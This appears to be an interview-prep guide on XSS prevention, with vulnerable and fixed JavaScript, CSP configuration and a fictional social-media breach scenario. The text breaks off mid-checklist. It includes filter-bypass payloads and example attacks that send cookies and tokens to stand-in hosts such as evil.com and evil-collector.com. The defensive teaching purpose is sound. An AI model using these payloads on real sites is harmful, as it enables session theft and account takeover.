# Cross-Site Scripting (XSS) Prevention

> **Focus**: Web Security fundamentals and attack prevention

---

## Question 1: What is Cross-Site Scripting (XSS) and how do you prevent it?

**Difficulty:** 🔴 Hard
**Frequency:** ⭐⭐⭐⭐⭐
**Time:** 15-20 minutes
**Companies:** Google, Meta, Amazon, Microsoft, Netflix, Airbnb

### Question
Explain the different types of XSS attacks (Stored, Reflected, DOM-based) and comprehensive prevention strategies.

### Answer

**Cross-Site Scripting (XSS)** is a security vulnerability that allows attackers to inject malicious JavaScript code into web pages viewed by other users. This happens when web applications include untrusted data in their output without proper validation or escaping.

**Three Main Types of XSS:**

1. **Stored XSS (Persistent)**
   - Malicious script is permanently stored on the target server (database, comment field, forum post)
   - Most dangerous because it affects all users who view the infected content
   - Example: User submits `<script>alert('XSS')</script>` in a comment that's saved to database

2. **Reflected XSS (Non-Persistent)**
   - Malicious script is reflected off the web server (URL parameters, search queries)
   - Requires victim to click a crafted link
   - Example: `https://example.com/search?q=<script>alert('XSS')</script>`

3. **DOM-based XSS**
   - Vulnerability exists in client-side code rather than server-side
   - Attack payload is executed by modifying the DOM environment
   - Example: JavaScript reads `location.hash` and writes it to `innerHTML`

### Code Example

**Vulnerable Code (XSS Attacks):**

```javascript
// ❌ VULNERABLE: Stored XSS
// Backend stores user input without sanitization
app.post('/comment', (req, res) => {
  const comment = req.body.comment; // ❌ No validation!
  db.comments.insert({ text: comment, user: req.user.id });
  res.json({ success: true });
});

// Frontend displays without escaping
function displayComments(comments) {
  const container = document.getElementById('comments');
  container.innerHTML = comments.map(c =>
    `<div class="comment">${c.text}</div>` // ❌ Direct HTML injection!
  ).join('');
}

// Attack: User submits comment:
// "<script>fetch('https://evil.com?cookie=' + document.cookie)</script>"
// Result: Steals cookies from all users who view the page


// ❌ VULNERABLE: Reflected XSS
app.get('/search', (req, res) => {
  const query = req.query.q; // ❌ No validation!
  res.send(`
    <h1>Search Results for: ${query}</h1>
    <p>No results found</p>
  `);
});

// Attack URL:
// https://example.com/search?q=<script>alert(document.cookie)</script>
// Result: Script executes when victim clicks malicious link


// ❌ VULNERABLE: DOM-based XSS
function displayWelcome() {
  const name = window.location.hash.substring(1); // ❌ Reads from URL
  document.getElementById('welcome').innerHTML =
    `Welcome, ${name}!`; // ❌ Writes to innerHTML
}

// Attack URL:
// https://example.com/#<img src=x onerror="alert(document.cookie)">
// Result: Script executes purely on client-side


// ❌ VULNERABLE: Common patterns
// 1. Using innerHTML with user data
element.innerHTML = userInput; // ❌

// 2. Using eval or Function constructor
eval(userInput); // ❌
new Function(userInput)(); // ❌

// 3. Direct script injection
document.write(`<script>${userInput}</script>`); // ❌

// 4. Event handler injection
element.setAttribute('onclick', userInput); // ❌

// 5. href javascript: protocol
link.href = `javascript:${userInput}`; // ❌
```

**Secure Code (XSS Prevention):**

```javascript
// ✅ SECURE: Input Validation & Output Encoding

// 1. SERVER-SIDE SANITIZATION (Node.js/Express)
const validator = require('validator');
const DOMPurify = require('isomorphic-dompurify');

app.post('/comment', (req, res) => {
  let comment = req.body.comment;

  // Step 1: Validate input
  if (!comment || typeof comment !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  // Step 2: Length validation
  if (comment.length > 5000) {
    return res.status(400).json({ error: 'Comment too long' });
  }

  // Step 3: Sanitize HTML (if allowing rich text)
  comment = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });

  // Step 4: Escape for database (prevent SQL injection too)
  db.comments.insert({
    text: validator.escape(comment),
    user: req.user.id
  });

  res.json({ success: true });
});


// 2. CLIENT-SIDE OUTPUT ENCODING
// ✅ Use textContent instead of innerHTML
function displayCommentsSafe(comments) {
  const container = document.getElementById('comments');

  comments.forEach(comment => {
    const div = document.createElement('div');
    div.className = 'comment';

    // textContent automatically escapes HTML
    div.textContent = comment.text; // ✅ Safe!

    container.appendChild(div);
  });
}

// ✅ HTML Escaping Function
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// Alternative: Manual escaping
function escapeHtmlManual(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return text.replace(/[&<>"'/]/g, char => map[char]);
}

// Usage:
const userInput = '<script>alert("XSS")</script>';
const safe = escapeHtml(userInput);
element.innerHTML = safe; // Displays: &lt;script&gt;alert("XSS")&lt;/script&gt;


// 3. CONTENT SECURITY POLICY (CSP)
// Set HTTP headers to prevent inline scripts
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' https://trusted-cdn.com; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none'; " +
    "base-uri 'self'; " +
    "form-action 'self'"
  );
  next();
});

// HTML meta tag (fallback):
// <meta http-equiv="Content-Security-Policy"
//       content="default-src 'self'; script-src 'self'">


// 4. FRAMEWORK-SPECIFIC PROTECTION

// ✅ React (auto-escaping)
function CommentList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        <div key={comment.id}>
          {/* React automatically escapes */}
          {comment.text} {/* ✅ Safe */}

          {/* dangerouslySetInnerHTML - use with extreme caution */}
          {/* <div dangerouslySetInnerHTML={{ __html: comment.text }} /> ❌ */}
        </div>
      ))}
    </div>
  );
}

// ✅ Vue (auto-escaping)
// <template>
//   <div v-for="comment in comments" :key="comment.id">
//     {{ comment.text }} <!-- Safe, auto-escaped -->
//     <!-- <div v-html="comment.text"></div> ❌ Unsafe -->
//   </div>
// </template>


// 5. SAFE DOM MANIPULATION
// ✅ GOOD: Using safe APIs
element.textContent = userInput;           // ✅ Safe
element.setAttribute('data-value', userInput); // ✅ Safe (non-executable attribute)
element.value = userInput;                 // ✅ Safe (for input elements)

// ❌ BAD: Unsafe APIs
element.innerHTML = userInput;             // ❌ Unsafe
element.outerHTML = userInput;             // ❌ Unsafe
element.insertAdjacentHTML('beforeend', userInput); // ❌ Unsafe


// 6. URL SANITIZATION
function sanitizeUrl(url) {
  // Whitelist safe protocols
  const allowedProtocols = ['http:', 'https:', 'mailto:'];

  try {
    const parsed = new URL(url, window.location.href);

    if (!allowedProtocols.includes(parsed.protocol)) {
      return '#'; // Return safe fallback
    }

    return parsed.href;
  } catch (e) {
    return '#'; // Invalid URL, return safe fallback
  }
}

// Usage:
const userUrl = getUserInput();
const safeUrl = sanitizeUrl(userUrl);
link.href = safeUrl;

// ❌ DANGEROUS:
link.href = 'javascript:alert("XSS")'; // Don't allow!

// ✅ SAFE:
link.href = sanitizeUrl('javascript:alert("XSS")'); // Returns '#'


// 7. COMPREHENSIVE XSS PREVENTION HELPER
class XSSPrevention {
  // Escape HTML entities
  static escapeHtml(text) {
    const map = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '/': '&#x2F;'
    };
    return String(text).replace(/[&<>"'/]/g, char => map[char]);
  }

  // Escape HTML attribute
  static escapeAttr(text) {
    return String(text)
      .replace(/&/g, '&amp;')
      .replace(/'/g, '&#x27;')
      .replace(/"/g, '&quot;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');
  }

  // Escape JavaScript string
  static escapeJs(text) {
    return String(text)
      .replace(/\\/g, '\\\\')
      .replace(/'/g, "\\'")
      .replace(/"/g, '\\"')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/\t/g, '\\t')
      .replace(/</g, '\\x3C')
      .replace(/>/g, '\\x3E');
  }

  // Validate and sanitize URL
  static sanitizeUrl(url) {
    const allowedProtocols = ['http:', 'https:', 'mailto:', 'tel:'];

    try {
      const parsed = new URL(url, window.location.href);

      if (!allowedProtocols.includes(parsed.protocol)) {
        console.warn(`Blocked dangerous URL protocol: ${parsed.protocol}`);
        return 'about:blank';
      }

      return parsed.href;
    } catch (e) {
      console.warn('Invalid URL:', url);
      return 'about:blank';
    }
  }

  // Safe innerHTML replacement
  static setHtmlContent(element, htmlString, allowedTags = []) {
    // Use DOMPurify if available
    if (typeof DOMPurify !== 'undefined') {
      element.innerHTML = DOMPurify.sanitize(htmlString, {
        ALLOWED_TAGS: allowedTags
      });
    } else {
      // Fallback: use textContent (no HTML)
      element.textContent = htmlString;
    }
  }
}

// Usage:
const comment = getUserInput();
element.textContent = XSSPrevention.escapeHtml(comment);

const url = getUserUrl();
link.href = XSSPrevention.sanitizeUrl(url);
```

### Common Mistakes

❌ **Wrong**: Trusting client-side validation alone
```javascript
// Client-side only (can be bypassed)
if (input.includes('<script>')) {
  alert('Invalid input'); // ❌ Attacker can disable JS
}
```

✅ **Correct**: Always validate server-side
```javascript
// Server-side validation
app.post('/api', (req, res) => {
  if (!isValid(req.body.input)) {
    return res.status(400).json({ error: 'Invalid input' });
  }
  // Process...
});
```

❌ **Wrong**: Blacklist filtering (incomplete)
```javascript
const sanitize = str => str.replace(/<script>/g, ''); // ❌ Bypassed easily
// Bypass: <ScRiPt>, <img onerror="...">, etc.
```

✅ **Correct**: Whitelist + proper escaping
```javascript
const sanitize = str => DOMPurify.sanitize(str, { ALLOWED_TAGS: ['b', 'i'] });
```

<details>
<summary><strong>🔍 Deep Dive: XSS Attack Vectors & Browser Security Model</strong></summary>

**How XSS Exploits Work at the Browser Level:**

The fundamental issue with XSS is that browsers cannot distinguish between legitimate JavaScript from your application and malicious JavaScript injected by an attacker. When user-supplied data is rendered as executable code, the browser executes it with full access to the page's security context.

**1. Browser Same-Origin Policy (SOP) & XSS**

```javascript
// Same-Origin Policy: Scripts can only access resources from the same origin
// Origin = Protocol + Domain + Port

// Same origin (can access each other):
// https://example.com:443/page1
// https://example.com:443/page2

// Different origins (cannot access):
// https://example.com (different from below)
// http://example.com  (different protocol)
// https://sub.example.com (different domain)
// https://example.com:8080 (different port)

// XSS BYPASSES Same-Origin Policy because:
// The injected script runs in the SAME origin as the vulnerable page!

// Example attack flow:
// 1. Attacker injects: <script src="https://evil.com/steal.js"></script>
// 2. Browser loads steal.js in context of victim site (example.com)
// 3. steal.js runs with example.com origin privileges
// 4. Can access: document.cookie, localStorage, make API requests as user

// Malicious script example:
fetch('https://evil.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,        // ✅ Accessible (same origin)
    localStorage: localStorage,       // ✅ Accessible
    sessionData: sessionStorage,      // ✅ Accessible
    dom: document.body.innerHTML      // ✅ Accessible
  })
});

// The attacker's server (evil.com) receives ALL sensitive data
// because the script executed with victim's origin privileges
```

**2. DOM XSS: Client-Side Vulnerability Deep Dive**

```javascript
// DOM XSS occurs when client-side JavaScript writes user data to dangerous sinks

// SOURCES (where attacker controls data):
const sources = {
  url: window.location.href,           // URL
  hash: window.location.hash,          // #fragment
  search: window.location.search,      // ?query=params
  referrer: document.referrer,         // Referrer header
  postMessage: window.addEventListener('message'), // Cross-window messaging
  localStorage: localStorage.getItem('key'),
  sessionStorage: sessionStorage.getItem('key')
};

// SINKS (dangerous operations that execute code):
const sinks = {
  // Code execution sinks:
  eval: eval(userInput),                              // ❌
  Function: new Function(userInput)(),                // ❌
  setTimeout: setTimeout(userInput, 1000),            // ❌
  setInterval: setInterval(userInput, 1000),          // ❌

  // HTML injection sinks:
  innerHTML: element.innerHTML = userInput,           // ❌
  outerHTML: element.outerHTML = userInput,           // ❌
  insertAdjacentHTML: element.insertAdjacentHTML('beforeend', userInput), // ❌
  document_write: document.write(userInput),          // ❌
  document_writeln: document.writeln(userInput),      // ❌

  // Attribute injection sinks:
  onclick: element.onclick = userInput,               // ❌
  onerror: img.onerror = userInput,                   // ❌
  onload: img.onload = userInput,                     // ❌
  setAttribute: element.setAttribute('onclick', userInput), // ❌

  // URL injection sinks:
  location: window.location = userInput,              // ❌
  href: link.href = userInput,                        // ❌ (if javascript:)
  src: script.src = userInput,                        // ❌ (if data:)

  // jQuery sinks (if using jQuery):
  html: $(element).html(userInput),                   // ❌
  append: $(element).append(userInput),               // ❌
  after: $(element).after(userInput)                  // ❌
};

// REAL ATTACK EXAMPLE:
// Vulnerable code:
function displayUserName() {
  // Source: URL hash
  const name = decodeURIComponent(window.location.hash.slice(1));

  // Sink: innerHTML
  document.getElementById('greeting').innerHTML =
    `<h1>Welcome, ${name}!</h1>`;
}

// Attack URL:
// https://example.com/#<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">

// What happens:
// 1. Browser loads page
// 2. JavaScript reads window.location.hash
// 3. innerHTML sets: <h1>Welcome, <img src=x onerror="...">!</h1>
// 4. Browser tries to load image, fails
// 5. onerror handler executes: sends cookies to attacker
// 6. No server-side code involved! Pure client-side exploit


// ✅ SECURE VERSION:
function displayUserNameSafe() {
  const name = decodeURIComponent(window.location.hash.slice(1));

  // Create element safely
  const h1 = document.createElement('h1');

  // Use textContent (auto-escapes)
  h1.textContent = `Welcome, ${name}!`;

  // Append to DOM
  document.getElementById('greeting').appendChild(h1);
}

// Attack URL has no effect:
// https://example.com/#<img src=x onerror="alert(1)">
// Displays: "Welcome, <img src=x onerror="alert(1)">!" (as text)
```

**3. Advanced XSS Bypass Techniques**

Attackers use sophisticated encoding and obfuscation to bypass filters:

```javascript
// Common bypass techniques:

// 1. CASE MANIPULATION
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

// 2. NULL BYTES
<script\x00>alert(1)</script>
<img src=x\x00onerror=alert(1)>

// 3. HTML ENCODING
<img src=x on&#101;rror=alert(1)>  // &#101; = 'e'
<img src=x on&#x65;rror=alert(1)>  // &#x65; = 'e' (hex)

// 4. JAVASCRIPT ENCODING
<script>\u0061lert(1)</script>  // \u0061 = 'a'
<script>\x61lert(1)</script>    // \x61 = 'a'

// 5. URL ENCODING
<img src=x onerror="&#x25;61lert(1)">  // %61 = 'a'

// 6. DOUBLE ENCODING
%253Cscript%253E  // Encodes < twice: < → %3C → %253C

// 7. BREAKING UP KEYWORDS
<img src=x one<!-- comment -->rror=alert(1)>
<scr<script>ipt>alert(1)</scr</script>ipt>

// 8. ALTERNATIVE EVENT HANDLERS
<body onload=alert(1)>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<audio src=x onerror=alert(1)>

// 9. JAVASCRIPT PROTOCOL
<a href="javascript:alert(1)">Click</a>
<form action="javascript:alert(1)"><button>Submit</button></form>

// 10. DATA URLS
<script src="data:text/javascript,alert(1)"></script>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

// 11. FILTER EVASION
// If filter removes <script>:
<scr<script>ipt>alert(1)</scr</script>ipt>
// After removal: <script>alert(1)</script>

// 12. USING LESS COMMON TAGS
<embed src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
<link rel="import" href="data:text/html,<script>alert(1)</script>">

// WHY BLACKLISTING FAILS:
// There are 100+ HTML tags, 200+ event handlers, countless encoding schemes
// Impossible to blacklist all attack vectors
```

**4. Content Security Policy (CSP) Deep Dive**

CSP is a browser security mechanism that prevents XSS by restricting resource loading:

```javascript
// CSP HEADER BREAKDOWN:

// Level 1: Basic protection
"Content-Security-Policy: default-src 'self'"
// Meaning: Only load resources from same origin
// Blocks: Inline scripts, eval, inline styles, external resources

// Level 2: Allow specific sources
"default-src 'self'; " +
"script-src 'self' https://cdn.example.com; " +
"style-src 'self' 'unsafe-inline'; " +
"img-src 'self' data: https:; " +
"font-src 'self' https://fonts.googleapis.com; " +
"connect-src 'self' https://api.example.com; " +
"frame-ancestors 'none'; " +
"base-uri 'self'; " +
"form-action 'self'"

// Directive meanings:
// - default-src: Fallback for all resource types
// - script-src: Where scripts can load from
// - style-src: Where stylesheets can load from
// - img-src: Where images can load from
// - font-src: Where fonts can load from
// - connect-src: Where fetch/XHR can connect to
// - frame-ancestors: Who can embed this page in iframe
// - base-uri: Allowed URLs for <base> tag
// - form-action: Where forms can submit to

// Level 3: Nonce-based CSP (most secure)
// Server generates random nonce for each request
const nonce = crypto.randomBytes(16).toString('base64');

res.setHeader(
  'Content-Security-Policy',
  `script-src 'nonce-${nonce}'; ` +
  `style-src 'nonce-${nonce}'; ` +
  `default-src 'self'`
);

// In HTML:
// <script nonce="abc123">console.log('Allowed');</script>
// <script>console.log('Blocked!');</script>  // No nonce = blocked

// Injected XSS has no way to know the nonce:
// <script>alert('XSS')</script>  // ❌ Blocked (no nonce)


// HOW CSP BLOCKS XSS:

// Example 1: Inline script blocked
// HTML: <script>alert(document.cookie)</script>
// CSP: script-src 'self'
// Result: ❌ Blocked (inline scripts not allowed)

// Example 2: External script from untrusted domain blocked
// HTML: <script src="https://evil.com/steal.js"></script>
// CSP: script-src 'self' cdn.example.com
// Result: ❌ Blocked (evil.com not in whitelist)

// Example 3: eval() blocked
// JS: eval('alert(1)')
// CSP: script-src 'self'
// Result: ❌ Blocked (eval not allowed without 'unsafe-eval')

// Example 4: Event handler blocked
// HTML: <img onerror="alert(1)" src="x">
// CSP: script-src 'self'
// Result: ❌ Blocked (inline event handlers not allowed)

// CSP violation report:
res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; " +
  "report-uri /csp-violation-report"
);

// Browser sends POST to /csp-violation-report when CSP blocks something:
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src 'self'",
    "blocked-uri": "https://evil.com/steal.js",
    "line-number": 42,
    "source-file": "https://example.com/page"
  }
}

// Log violations to detect XSS attempts:
app.post('/csp-violation-report', (req, res) => {
  console.warn('CSP Violation:', req.body);
  // Alert security team, block IP, etc.
  res.status(204).end();
});
```

**5. Browser XSS Auditor (Deprecated) & XSS Filter**

```javascript
// Modern browsers used to have built-in XSS filters:
// Chrome XSS Auditor (removed in 2019)
// Internet Explorer XSS Filter (deprecated)

// Why they were removed:
// 1. Could be bypassed
// 2. Caused false positives
// 3. CSP is more effective

// HTTP header to control (now obsolete):
// X-XSS-Protection: 1; mode=block

// Modern approach: Use CSP instead
```

**6. Mutation XSS (mXSS)**

A rare but advanced XSS variant that exploits browser parsing inconsistencies:

```javascript
// mXSS occurs when HTML is sanitized, then parsed differently by browser

// Example attack:
const userInput = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';

// After sanitization (DOMPurify old version):
// <noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>

// Browser parsing (when <noscript> is active):
// Closes noscript early, executes: <img src=x onerror=alert(1)>

// Defense: Use latest DOMPurify (fixes mXSS) and CSP
```

**7. Prototype Pollution → XSS Chain**

```javascript
// Prototype pollution can lead to XSS in some frameworks:

// Step 1: Pollute Object.prototype
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
Object.assign({}, payload);

// Step 2: Framework uses polluted property
// Example vulnerable template rendering:
function render(user) {
  if (user.isAdmin) {  // ❌ Checks prototype chain
    return `<div class="admin">${user.name}</div>`;
  }
  return `<div>${user.name}</div>`;
}

// Attack: Pollute prototype, inject XSS in admin-only section
// Defense: Use Object.create(null) for dictionaries, validate all properties
```

</details>

<details>
<summary><strong>🐛 Real-World Scenario: XSS Breach at Social Media Platform</strong></summary>

**Scenario**: Your team manages a social media platform with 5 million users. On a Friday evening, the security team detects unusual activity: thousands of users' sessions are being hijacked, and their accounts are posting spam links. Investigation reveals a Stored XSS vulnerability in the user profile "bio" field that has been exploited by attackers.

**Production Metrics (During Attack):**
- Affected users: 127,000+ (2.5% of user base)
- Attack duration: 6 hours before detection
- Stolen session tokens: 127,000+
- Spam posts created: 380,000+
- API rate limit breaches: 15,000/minute (normal: 2,000/min)
- User reports: 3,400 complaints in 2 hours
- Stock price drop: -12% in after-hours trading
- Estimated financial impact: $8.5M (response costs + user compensation)

**The Vulnerability:**

```javascript
// ❌ VULNERABLE CODE (Production)
// Backend: User profile update endpoint
app.put('/api/user/profile', authenticateUser, async (req, res) => {
  const { bio, location, website } = req.body;

  // ❌ NO SANITIZATION!
  await db.users.update(
    { id: req.user.id },
    {
      bio,           // ❌ Stored as-is
      location,      // ❌ Stored as-is
      website        // ❌ Stored as-is
    }
  );

  res.json({ success: true });
});

// Frontend: Profile display component (React)
function UserProfile({ user }) {
  return (
    <div className="profile">
      <h1>{user.name}</h1>

      {/* ❌ CRITICAL VULNERABILITY: Using dangerouslySetInnerHTML */}
      <div
        className="bio"
        dangerouslySetInnerHTML={{ __html: user.bio }}
      />

      <div className="location">{user.location}</div>
      <a href={user.website}>Website</a>  {/* ❌ No URL validation */}
    </div>
  );
}
```

**The Attack:**

```javascript
// Attacker creates malicious bio:
const maliciousBio = `
  <p>Check out my awesome page!</p>
  <img src="invalid" onerror="
    // Steal session token
    const token = localStorage.getItem('authToken');

    // Send to attacker's server
    fetch('https://evil-collector.com/harvest', {
      method: 'POST',
      body: JSON.stringify({
        token: token,
        cookies: document.cookie,
        url: window.location.href,
        user: document.querySelector('.profile h1').textContent
      })
    });

    // Post spam on behalf of user
    fetch('/api/posts', {
      method: 'POST',
      headers: {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: 'Check out this amazing offer! http://spam-link.com'
      })
    });

    // Follow attacker's account
    fetch('/api/follow', {
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + token },
      body: JSON.stringify({ userId: 999999 }) // Attacker's account
    });
  " />
`;

// Attacker updates their profile:
PUT /api/user/profile
{
  "bio": "<malicious_bio_above>",
  "location": "Global",
  "website": "javascript:void(fetch('https://evil.com?c='+document.cookie))"
}

// Attack spreads:
// 1. User A visits attacker's profile → Script executes → Token stolen
// 2. Script posts spam from User A's account
// 3. User A's followers see spam post, click profile link
// 4. User B, C, D visit profile → Scripts execute → Tokens stolen
// 5. Exponential spread across platform (worm-like behavior)
```

**Detection & Response Timeline:**

```javascript
// FRIDAY, 6:00 PM: Attack begins
// - Attacker updates profile with XSS payload
// - First victims view profile

// 6:30 PM: Automated alerts triggered
// - API rate limiting system detects anomaly
// - 15,000 POST /api/posts per minute (normal: 2,000/min)
console.log('[ALERT] API rate limit breached: 750% increase in POST /api/posts');

// 7:00 PM: Security team notified
// - Ops engineer checks logs
// - Sees identical posts from multiple accounts
// - Recognizes spam pattern

// 7:15 PM: First user reports
// - "My account is posting spam I didn't create!"
// - Support tickets: 150 in 15 minutes

// 7:30 PM: Security analysis begins
const suspiciousActivity = await db.query(`
  SELECT user_id, COUNT(*) as post_count
  FROM posts
  WHERE created_at > NOW() - INTERVAL 1 HOUR
  GROUP BY user_id
  HAVING post_count > 10
  ORDER BY post_count DESC
  LIMIT 100
`);

// Result: 4,200 users with 10+ posts in 1 hour (normal: 50 users)

// 8:00 PM: Root cause identified
// - Security engineer inspects affected user profiles
// - Views profile in browser DevTools
// - Sees JavaScript execution in bio field
// - Finds XSS payload

// 8:15 PM: IMMEDIATE MITIGATIONS
// 1. Disable profile views temporarily
app.get('/profile/:userId', (req, res) => {
  res.status(503).send('Profile viewing temporarily disabled for security maintenance');
});

// 2. Revoke all active sessions
await db.sessions.deleteMany({});
// Forces all users to re-login (clears stolen tokens)

// 3. Clear malicious bio from database
await db.users.updateMany(
  { bio: { $regex: /<script|<img|onerror|onload/i } },
  { $set: { bio: '[Removed by security team]' } }
);
// Sanitized 1,247 profiles

// 8:45 PM: Deploy emergency patch
// ✅ PATCHED CODE:
const DOMPurify = require('isomorphic-dompurify');

app.put('/api/user/profile', authenticateUser, async (req, res) => {
  let { bio, location, website } = req.body;

  // 1. Input validation
  if (bio && bio.length > 5000) {
    return res.status(400).json({ error: 'Bio too long' });
  }

  // 2. Sanitize bio (allow limited HTML)
  bio = DOMPurify.sanitize(bio, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href'],
    ALLOWED_URI_REGEXP: /^https?:\/\//
  });

  // 3. Validate URL
  if (website) {
    try {
      const url = new URL(website);
      if (!['http:', 'https:'].includes(url.protocol)) {
        website = null; // Reject javascript:, data:, etc.
      }
    } catch (e) {
      website = null; // Invalid URL
    }
  }

  await db.users.update(
    { id: req.user.id },
    { bio, location, website }
  );

  res.json({ success: true });
});

// Frontend fix (React):
function UserProfile({ user }) {
  return (
    <div className="profile">
      <h1>{user.name}</h1>

      {/* ✅ FIXED: Use sanitized HTML with DOMPurify */}
      <div
        className="bio"
        dangerouslySetInnerHTML={{
          __html: DOMPurify.sanitize(user.bio, {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
            ALLOWED_ATTR: ['href']
          })
        }}
      />

      <div className="location">{user.location}</div>

      {/* ✅ FIXED: Validate URL before rendering */}
      {user.website && isValidUrl(user.website) && (
        <a
          href={user.website}
          rel="noopener noreferrer"
          target="_blank"
        >
          Website
        </a>
      )}
    </div>
  );
}

function isValidUrl(url) {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch (e) {
    return false;
  }
}

// 9:00 PM: Add Content Security Policy
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'nonce-{{NONCE}}' https://cdn.example.com; " +
    "style-src 'self' 'unsafe-inline' https://cdn.example.com; " +
    "img-src 'self' https: data:; " +
    "font-src 'self' https://fonts.googleapis.com; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none'; " +
    "base-uri 'self'; " +
    "form-action 'self'; " +
    "upgrade-insecure-requests; " +
    "block-all-mixed-content; " +
    "report-uri /csp-violations"
  );
  next();
});

// 10:00 PM: Services restored
// - Profile viewing re-enabled
// - Monitoring increased
// - Users forced to re-login

// 11:00 PM: User communication
// - Email sent to affected users
// - In-app notification about security incident
// - Instructions to change passwords
```

**Post-Incident Analysis:**

```javascript
// SATURDAY: Damage assessment
const incidentReport = {
  timeline: {
    attackStart: '2024-01-12 18:00 UTC',
    detected: '2024-01-12 18:30 UTC',
    mitigated: '2024-01-12 20:45 UTC',
    totalDuration: '2 hours 45 minutes'
  },

  impact: {
    affectedUsers: 127000,
    stolenTokens: 127000,
    spamPostsCreated: 380000,
    maliciousProfilesCreated: 1247,
    userReports: 3400,
    supportTickets: 8900
  },

  financialCost: {
    incidentResponseTeam: 45000,      // Overtime, contractors
    userCompensation: 2540000,        // Account credits
    legalFees: 1200000,               // Regulatory compliance
    publicRelations: 850000,          // Crisis management
    reputationDamage: 3865000,        // Estimated churn
    total: 8500000
  },

  rootCause: [
    'No input sanitization on user-generated content',
    'Using dangerouslySetInnerHTML without DOMPurify',
    'No Content Security Policy',
    'Insufficient security code reviews',
    'No automated XSS scanning in CI/CD'
  ]
};

// WEEK 1-2: Comprehensive security overhaul
// 1. Audit entire codebase for XSS vulnerabilities
const xssAuditScript = `
  grep -r "dangerouslySetInnerHTML" src/
  grep -r "innerHTML" src/
  grep -r "eval(" src/
  grep -r "new Function" src/
`;

// Found 43 instances of dangerouslySetInnerHTML
// Fixed all with DOMPurify or replaced with textContent

// 2. Implement automated security scanning
// package.json:
{
  "scripts": {
    "security": "npm audit && snyk test",
    "xss-scan": "eslint . --ext .js,.jsx --plugin security",
    "pre-commit": "npm run security && npm run xss-scan"
  },
  "devDependencies": {
    "eslint-plugin-security": "^1.7.1",
    "snyk": "^1.1060.0"
  }
}

// 3. Add ESLint rules to prevent XSS
// .eslintrc.js:
module.exports = {
  plugins: ['security'],
  rules: {
    'security/detect-eval-with-expression': 'error',
    'security/detect-non-literal-regexp': 'warn',
    'security/detect-unsafe-regex': 'error',
    'react/no-danger': 'error',  // Ban dangerouslySetInnerHTML
    'react/no-danger-with-children': 'error'
  }
};

// 4. Implement security headers middleware
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-{{NONCE}}'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "https:", "data:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'", "https://fonts.googleapis.com"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  noSniff: true,
  xssFilter: true,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' }
}));

// 5. Add rate limiting to prevent rapid exploitation
const rateLimit = require('express-rate-limit');

const profileUpdateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Max 5 profile updates per 15 min
  message: 'Too many profile updates, please try again later'
});

app.put('/api/user/profile', profileUpdateLimiter, ...);

// 6. Implement security logging & monitoring
app.use((req, res, next) => {
  // Log all profile updates for audit trail
  if (req.path === '/api/user/profile' && req.method === 'PUT') {
    securityLogger.log({
      timestamp: new Date(),
      userId: req.user.id,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      payload: req.body,
      sanitizedPayload: DOMPurify.sanitize(req.body.bio)
    });
  }
  next();
});

// 7. Penetration testing
// Hired external security firm
// Found 3 more XSS vulnerabilities (fixed)
// Cost: $75,000
```

**Lessons Learned & Long-Term Improvements:**

```javascript
// IMPLEMENTED SECURITY BEST PRACTICES:

// 1. Defense in Depth (multiple layers)
const securityLayers = {
  layer1_input: 'Validate & sanitize ALL user input server-side',
  layer2_storage: 'Store sanitized data in database',
  layer3_output: 'Escape/sanitize data when rendering',
  layer4_csp: 'Content Security Policy to block inline scripts',
  layer5_headers: 'Security headers (X-Content-Type-Options, etc.)',
  layer6_monitoring: '24/7 security monitoring & alerting',
  layer7_education: 'Developer security training quarterly'
};

// 2. Mandatory security code review checklist
const securityChecklist = [
  '☐ All user inputs validated server-side?',
